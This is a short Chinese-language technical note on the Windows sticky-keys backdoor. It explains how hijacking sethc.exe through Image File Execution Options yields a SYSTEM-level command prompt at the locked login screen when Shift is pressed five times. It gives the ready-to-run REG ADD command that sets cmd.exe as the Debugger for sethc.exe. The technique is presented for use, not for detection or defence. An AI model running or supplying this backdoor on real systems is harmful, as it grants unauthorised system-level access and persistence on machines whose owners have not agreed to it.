可以修改注册表进行 IFEO 劫持，设置镜像劫持shift后门（也可以设置其他的），然后锁定用户五次shift以管理员身份打开了cmd（在锁定用户后，粘滞键快捷方式在登录屏幕运行，而登录屏幕上的任何命令提示符都运行在更高的系统权限级别。这是因为在Windows登录屏幕上执行的任何命令都被视为系统级操作，通常具有更高的权限。而在用户会话中，启动的命令提示符默认是以当前用户权限级别运行的，而不是管理员权限）

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
